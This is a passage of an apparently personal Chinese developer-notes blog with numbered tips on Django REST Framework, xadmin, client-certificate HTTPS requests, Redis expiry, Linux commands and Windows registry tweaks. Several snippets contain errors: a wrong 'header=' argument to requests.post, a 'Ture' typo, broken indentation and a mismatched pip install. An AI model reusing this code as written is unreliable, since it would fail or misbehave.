id="30、uwsgi初始配置问题"><a href="#30、uwsgi初始配置问题" class="headerlink" title="30、uwsgi初始配置问题"></a>30、uwsgi初始配置问题</h2><p><a href="https://blog.csdn.net/weixin_39735923/article/details/79202563">https://blog.csdn.net/weixin_39735923/article/details/79202563</a></p><h2 id="31、django中drf序列化"><a href="#31、django中drf序列化" class="headerlink" title="31、django中drf序列化"></a>31、django中drf序列化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 序列化器</span><br><span class="line">class MsgSerializers(serializers.ModelSerializer):</span><br><span class="line">    addtime = serializers.DateTimeField(read_only=True, format=&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">    hasread = serializers.CharField(source=&#x27;get_hasread_display&#x27;)</span><br><span class="line">    msgtype = serializers.CharField(source=&#x27;get_msgtype_display&#x27;)</span><br><span class="line">    class Meta:</span><br><span class="line">        model = MallMsg</span><br><span class="line">        # 可以混合使用</span><br><span class="line">        fields = &#x27;__all__&#x27;  # &#x27;__all__&#x27; 所有字段</span><br><span class="line">        # 数据库层级控制（序列化链表操作）</span><br><span class="line">        # depth = 1  # 外键层级</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#分页器</span><br><span class="line">from rest_framework.pagination import PageNumberPagination</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyLimitOffsetPagination(PageNumberPagination):</span><br><span class="line"></span><br><span class="line">    page_size = 3  # 默认的页面数据数量</span><br><span class="line">    page_query_param = &#x27;page&#x27;  # 定制取数据页码key ？</span><br><span class="line">    page_size_query_param = &#x27;page_size&#x27;  # 默认取数据页码key &amp;</span><br><span class="line">    max_page_size = 15  # 数据每页取值的最大上限</span><br></pre></td></tr></table></figure><h2 id="32、第三方库"><a href="#32、第三方库" class="headerlink" title="32、第三方库"></a>32、第三方库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装openssl</span><br><span class="line"> pip3 install pyOpenSSL</span><br></pre></td></tr></table></figure><h2 id="33、requests请求https携带CA证书"><a href="#33、requests请求https携带CA证书" class="headerlink" title="33、requests请求https携带CA证书"></a>33、requests请求https携带CA证书</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import OpenSSL</span><br><span class="line">import requests</span><br><span class="line">import urllib3.contrib.pyopenssl</span><br><span class="line"></span><br><span class="line">urllib3.contrib.pyopenssl.inject_into_urllib3()</span><br><span class="line"></span><br><span class="line">def p12_to_pem(certname, pwd):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    从.p12文件中提取pem</span><br><span class="line">    :param certname:</span><br><span class="line">    :param pwd:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    pem_name = certname + &quot;.pem&quot;</span><br><span class="line">    f_pem = open(pem_name, &#x27;wb&#x27;)</span><br><span class="line">    p12file = certname + &quot;.p12&quot;</span><br><span class="line">    p12 = OpenSSL.crypto.load_pkcs12(open(p12file, &#x27;rb&#x27;).read(), pwd)</span><br><span class="line">    f_pem.write(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, p12.get_privatekey()))</span><br><span class="line">    f_pem.write(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, p12.get_certificate()))</span><br><span class="line">    ca = p12.get_ca_certificates()</span><br><span class="line">    if ca is not None:</span><br><span class="line">        for cert in ca:</span><br><span class="line">            f_pem.write(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert))</span><br><span class="line">    f_pem.close()</span><br><span class="line">    return pem_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def post_cert_request(url, data,header, certname, pwd):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    使用证书发起https请求</span><br><span class="line">    :param url:</span><br><span class="line">    :param data:</span><br><span class="line">    :param certname:</span><br><span class="line">    :param pwd:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if (certname != &quot;&quot;):</span><br><span class="line">        cert = p12_to_pem(certname, pwd)</span><br><span class="line">    else:</span><br><span class="line">        cert = None</span><br><span class="line">    r = requests.post(url, header=header, data=data, cert=cert)</span><br><span class="line">    return r</span><br></pre></td></tr></table></figure><h2 id="34、django创建缓存命令"><a href="#34、django创建缓存命令" class="headerlink" title="34、django创建缓存命令"></a>34、django创建缓存命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py createcachetable 缓存表名</span><br></pre></td></tr></table></figure><h2 id="35、Django-更改超级用户密码"><a href="#35、Django-更改超级用户密码" class="headerlink" title="35、Django 更改超级用户密码"></a>35、Django 更改超级用户密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在工程文件目录下敲入：</span><br><span class="line">python manage.py shell</span><br><span class="line"></span><br><span class="line">再在python交互界面输入：</span><br><span class="line">from django.contrib.auth.models import User</span><br><span class="line">user = User.objects.get(username = &#x27;用户名&#x27;)</span><br><span class="line">user.set_password(&#x27;密码&#x27;)</span><br><span class="line">user.save()</span><br></pre></td></tr></table></figure><h2 id="36、restframe使用缓存"><a href="#36、restframe使用缓存" class="headerlink" title="36、restframe使用缓存"></a>36、restframe使用缓存</h2><p><a href="https://blog.csdn.net/Odyssues_lee/article/details/80872586">https://blog.csdn.net/Odyssues_lee/article/details/80872586</a></p><h2 id="37、数据库"><a href="#37、数据库" class="headerlink" title="37、数据库"></a>37、数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user  where ISNULL(code)</span><br><span class="line">update user set code=&#x27;111&#x27;,info=&#x27;微信&#x27; where ISNULL(code)</span><br></pre></td></tr></table></figure><h2 id="38、linux常用命令"><a href="#38、linux常用命令" class="headerlink" title="38、linux常用命令"></a>38、linux常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">tail -f 日志名  实时监控日志</span><br><span class="line">tail -f 80_v10.log</span><br><span class="line"></span><br><span class="line">netstat -na|grep 80  查看端口tcp连接数</span><br><span class="line">netstat -na|grep 80 | wc -l 计算端口tcp连接数</span><br><span class="line"></span><br><span class="line">ps -ef|grep python  查看有多少python程序在运行</span><br><span class="line"></span><br><span class="line">gunzip 2015.csv.gz   # 解压</span><br><span class="line">unzip 19.zip # 解压zip</span><br><span class="line">wc -l 2015.csv   # 查看行数</span><br><span class="line">apt install lrzsz  # 安装</span><br><span class="line">sz 文件名  # 下载文件</span><br><span class="line"></span><br><span class="line">查找文件</span><br><span class="line">find / -name 文件名</span><br><span class="line"></span><br><span class="line">匹配执行过的以find为开头的命令</span><br><span class="line">history | grep find</span><br></pre></td></tr></table></figure><h2 id="39、xadmin禁止增加、删除"><a href="#39、xadmin禁止增加、删除" class="headerlink" title="39、xadmin禁止增加、删除"></a>39、xadmin禁止增加、删除</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># models.py</span><br><span class="line"># 用户管理</span><br><span class="line">class UserManage(models.Model):</span><br><span class="line">    name = models.CharField(max_length=20, verbose_name=&#x27;用户名&#x27;)</span><br><span class="line">    phone = models.CharField(max_length=11, unique=True, verbose_name=&#x27;手机号&#x27;)</span><br><span class="line">    code = models.CharField(max_length=11, unique=True, verbose_name=&#x27;编号&#x27;)</span><br><span class="line">    </span><br><span class="line">    user = models.ForeignKey(User, on_delete=models.CASCADE, editable=False, null=True, verbose_name=&#x27;管理员&#x27;)</span><br><span class="line"></span><br><span class="line"># adminx.py</span><br><span class="line"># 用户列表</span><br><span class="line">class UserAdmin(object):</span><br><span class="line">    list_display = [ &#x27;code&#x27;, &#x27;phone&#x27;, &#x27;name&#x27;,]</span><br><span class="line">    search_fields = [&#x27;code&#x27;, &#x27;phone&#x27;]</span><br><span class="line">    list_filter = [&#x27;code&#x27;, &#x27;phone&#x27;]</span><br><span class="line">    list_editable = [&#x27;name&#x27;]  # 数据即时编辑</span><br><span class="line">    readonly_fields = [&#x27;code&#x27;, &#x27;phone&#x27;, &#x27;name&#x27;]  # 只读字段，不能编辑</span><br><span class="line">    model_icon = &#x27;fa fa-square&#x27;</span><br><span class="line">    model = UserInfo</span><br><span class="line">    </span><br><span class="line">    def has_delete_permission(self, *args, **kwargs):</span><br><span class="line">    # 禁止删除</span><br><span class="line">        if args:</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line">    </span><br><span class="line">def has_add_permission(self,*args,**kwargs):</span><br><span class="line"># 禁止增加</span><br><span class="line">        return False</span><br><span class="line">        </span><br><span class="line">    def save_models(self):</span><br><span class="line">    # 用户级别设置</span><br><span class="line">        self.new_obj.user = self.request.user</span><br><span class="line">        flag = self.org_obj is None and &#x27;create&#x27; or &#x27;change&#x27;</span><br><span class="line">        if flag == &#x27;create&#x27;:</span><br><span class="line">        # 对密码字段进行加密</span><br><span class="line">            self.new_obj.password = encrypt_oracle(self.new_obj.password)</span><br><span class="line">        elif flag == &#x27;change&#x27;:</span><br><span class="line">            if &#x27;password&#x27; in self.change_message():</span><br><span class="line">                self.new_obj.password = encrypt_oracle(self.new_obj.password)</span><br><span class="line">        else:</span><br><span class="line">        pass</span><br><span class="line">        super().save_models()</span><br><span class="line"></span><br><span class="line">xadmin.site.register(UserInfo, UserAdmin)</span><br></pre></td></tr></table></figure><h2 id="40、时间格式字符串相减"><a href="#40、时间格式字符串相减" class="headerlink" title="40、时间格式字符串相减"></a>40、时间格式字符串相减</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">start = str(datetime.datetime.now())[:19]</span><br><span class="line">time.sleep(60)</span><br><span class="line">end = str(datetime.datetime.now())[:19]</span><br><span class="line">print(start,end)</span><br><span class="line">link_start = datetime.datetime.strptime(start, &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line">link_end = datetime.datetime.strptime(end, &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line">link_min = round((link_end - link_start).seconds / 60, 2)</span><br><span class="line">print(link_min,&#x27;分钟&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="41、显示循环进度条"><a href="#41、显示循环进度条" class="headerlink" title="41、显示循环进度条"></a>41、显示循环进度条</h2><p>参考：<a href="https://blog.csdn.net/zejianli/article/details/77915751">https://blog.csdn.net/zejianli/article/details/77915751</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from tqdm import tqdm,trange</span><br><span class="line">from time import sleep</span><br><span class="line">text = &quot;&quot;</span><br><span class="line">for char in tqdm([&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]):</span><br><span class="line">    text = text + char</span><br><span class="line">    sleep(1)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"># 方式二</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_bar(percent, index, total,start_time, start_str=&#x27;&#x27;, end_str=&#x27;&#x27;, total_length=100):</span><br><span class="line">    # 进度条</span><br><span class="line">    percent_length = int(percent)</span><br><span class="line">    bar = &#x27;\r&#x27; + start_str + (&#x27;\033[1;31;41m \033[0m&#x27; * percent_length + &#x27;\033[1;37;47m \033[0m&#x27; * (</span><br><span class="line">                total_length - percent_length)) + f&#x27;  &#123;round(index / total * 100, 2)&#125;%  &#x27; + f&#x27; &#123;index&#125;|&#123;end_str&#125;&#x27;+ f&#x27;   |已进行时间: &#123;round(time.time() - start_time, 2)&#125;秒&#x27;</span><br><span class="line"></span><br><span class="line">    print(bar, end=&#x27;&#x27;, flush=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    data_set = [i for i in range(23)]</span><br><span class="line">    i = 0</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    total = len(data_set)</span><br><span class="line">    end_str = &#x27;&#123;&#125;&#x27;.format(total)</span><br><span class="line">    for data in data_set:</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        i += 1</span><br><span class="line">        process_bar(i * 100 / total, i, total, start_time, start_str=&#x27;&#x27;, end_str=end_str, total_length=100)</span><br><span class="line"></span><br><span class="line"># 方式三</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">d = [i for i in range(100)]</span><br><span class="line">for i in range(len(d)):</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    sys.stdout.write(&#x27;\r&gt;&gt; Downloading  %.2f%%&#x27; % (float(i) / float(len(d)) * 100.0))</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="42、把列表中的字典转成csv文件"><a href="#42、把列表中的字典转成csv文件" class="headerlink" title="42、把列表中的字典转成csv文件"></a>42、把列表中的字典转成csv文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">lists = [&#123;&#x27;a&#x27;:1,&#x27;b&#x27;:2&#125;,&#123;&#x27;a&#x27;:2,&#x27;b&#x27;:3&#125;]</span><br><span class="line">df = pd.DataFrame(lists)</span><br><span class="line">print(df)</span><br><span class="line">df.to_csv(&#x27;result2.csv&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="43、windows添加右键新建MarkDown文件"><a href="#43、windows添加右键新建MarkDown文件" class="headerlink" title="43、windows添加右键新建MarkDown文件"></a>43、windows添加右键新建MarkDown文件</h2><p>在网上下载Typora软件安装后<br>1、在桌面上新建一个txt文件，输入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_CLASSES_ROOT\.md\ShellNew]</span><br><span class="line">&quot;NullFile&quot;=&quot;&quot;</span><br><span class="line">&quot;FileName&quot;=&quot;template.md&quot;</span><br></pre></td></tr></table></figure><p>2、另存为，改后缀为.reg，保存类型为.txt，编码为Unicode</p><p><img src="https://img-blog.csdnimg.cn/20200526232015169.png" alt="在这里插入图片描述"></p><p>3、双击运行，确定，重启电脑，此时在桌面右键就有了新建md文件</p><h2 id="44、redis设置值定时过期"><a href="#44、redis设置值定时过期" class="headerlink" title="44、redis设置值定时过期"></a>44、redis设置值定时过期</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import redis</span><br><span class="line"></span><br><span class="line">redis_client = redis.Redis(</span><br><span class="line">    host=&#x27;127.0.0.1&#x27;,</span><br><span class="line">    port=6379,</span><br><span class="line">    db=0,</span><br><span class="line">    password=&#x27;123456&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def redis_set():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    redis设置值定时过期</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    global redis_client</span><br><span class="line"></span><br><span class="line">    redis_client.set(&#x27;name&#x27;,&#x27;ldc&#x27;)</span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    # 设置‘name’50秒过期</span><br><span class="line">    expire_time = now + datetime.timedelta(hours=0, minutes=0, seconds=50)</span><br><span class="line">    redis_client.expireat(&#x27;name&#x27;, expire_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    redis_set()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="45、linux根据端口杀进程"><a href="#45、linux根据端口杀进程" class="headerlink" title="45、linux根据端口杀进程"></a>45、linux根据端口杀进程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def killport(port):</span><br><span class="line">    command = &#x27;&#x27;&#x27;kill -9 $(netstat -nlp | grep :&#x27;&#x27;&#x27; + str(port) + &#x27;&#x27;&#x27; | awk &#x27;&#123;print $7&#125;&#x27; | awk -F&quot;/&quot; &#x27;&#123; print $1 &#125;&#x27;)&#x27;&#x27;&#x27;</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 开始执行</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    port = 4237</span><br><span class="line">    killport(port)</span><br></pre></td></tr></table></figure><h2 id="46、监控linux网络流量"><a href="#46、监控linux网络流量" class="headerlink" title="46、监控linux网络流量"></a>46、监控linux网络流量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iftop -n -N -i eth0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nethogs eth0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vim +/字符串 文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="47、win10添加右键打开cmd"><a href="#47、win10添加右键打开cmd" class="headerlink" title="47、win10添加右键打开cmd"></a>47、win10添加右键打开cmd</h2><p>通过添加注册表项实现</p><p>win + r 输入 regedit</p><p>找到注册表位置：HKEY_CLASSES_ROOT\Directory\Background\shell\</p><p>右键“shel”l,新建“项”，命名为“以管理员身份打开cmd”，</p><p>右键“以管理员身份打开cmd”，新建“DWORD(32位)值”，命名为”ShowBasedOnVelocityId”,值为“639bc8”</p><p>右键“以管理员身份打开cmd”，新建“项”，命名为“command”</p><p>右键“command”，点击“默认”，点击“修改”，填写数值为 cmd.exe &#x2F;s &#x2F;k pushd “%V”</p><h2 id="48、xadmin后台无法显示下拉框完整内容"><a href="#48、xadmin后台无法显示下拉框完整内容" class="headerlink" title="48、xadmin后台无法显示下拉框完整内容"></a>48、xadmin后台无法显示下拉框完整内容</h2><p>解决方案 在根目录中找到&#x2F;static&#x2F;xadmin&#x2F;vendor&#x2F;selectize&#x2F;selectize.bootstrap3.css<br>在331行后加入 position: static;</p><p><img src="https://img-blog.csdnimg.cn/20190704184201572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="49、xadmin单点登录"><a href="#49、xadmin单点登录" class="headerlink" title="49、xadmin单点登录"></a>49、xadmin单点登录</h2><p>使用中间件实现。</p><p>新建一个utils.py文件，存放以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib.sessions.models import Session</span><br><span class="line">from django.db.models import Q</span><br><span class="line">from django.utils import timezone</span><br><span class="line">from django.utils.deprecation import MiddlewareMixin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class XadminMiddleware(MiddlewareMixin):</span><br><span class="line">    def process_request(self, request):</span><br><span class="line">        &quot;&quot;&quot;xadmin后台单点登录&quot;&quot;&quot;</span><br><span class="line">        PATH_INFO = request.META.get(&#x27;PATH_INFO&#x27;, &#x27;&#x27;)</span><br><span class="line">        if PATH_INFO and &#x27;xadmin&#x27; in PATH_INFO:</span><br><span class="line">            request.session.clear_expired()   # 清除过期的key</span><br><span class="line">            session_key = request.session.session_key</span><br><span class="line">            for session in Session.objects.filter(~Q(session_key=session_key), expire_date__gte=timezone.now()):</span><br><span class="line">                data = session.get_decoded()</span><br><span class="line">                if data.get(&#x27;_auth_user_id&#x27;, None) == str(request.user.id):</span><br><span class="line">                    session.delete()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在urls.py中设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">...</span><br><span class="line">re_path(&#x27;^xadmin/&#x27;, xadmin.site.urls),</span><br><span class="line">...</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>然后在settings.py中注册中间件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   MIDDLEWARE = [</span><br><span class="line">   ...</span><br><span class="line">   </span><br><span class="line">   &#x27;utils.xadminauth.XadminMiddleware&#x27;,</span><br><span class="line">   ...</span><br><span class="line">   ]</span><br><span class="line">SESSION_COOKIE_AGE = 1209600  # 设置过期时间</span><br><span class="line">   SESSION_SAVE_EVERY_REQUEST = Ture  # 每次请求都更新</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>【参考】 <a href="https://blog.csdn.net/Python_anning">https://blog.csdn.net/Python_anning</a></p><h2 id="50、Django-restful-多个models数据表序列化合并返回（一次请求返回多个序列化器数据）"><a href="#50、Django-restful-多个models数据表序列化合并返回（一次请求返回多个序列化器数据）" class="headerlink" title="50、Django restful 多个models数据表序列化合并返回（一次请求返回多个序列化器数据）"></a>50、Django restful 多个models数据表序列化合并返回（一次请求返回多个序列化器数据）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"># 导入第三方包</span><br><span class="line">pip install django-crispy-forms==1.7.2</span><br><span class="line"></span><br><span class="line"># 在settings.py中添加应用</span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">...</span><br><span class="line">&#x27;drf_multiple_model&#x27;,</span><br><span class="line">&#x27;rest_framework&#x27;,</span><br><span class="line">...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 在views.py中使用</span><br><span class="line">    from drf_multiple_model.pagination import MultipleModelLimitOffsetPagination</span><br><span class="line">    from drf_multiple_model.views import ObjectMultipleModelAPIView</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    class LimitPagination(MultipleModelLimitOffsetPagination):</span><br><span class="line">        # 多个models数据表联合查询，分页，每页限制数据10条</span><br><span class="line">        default_limit = 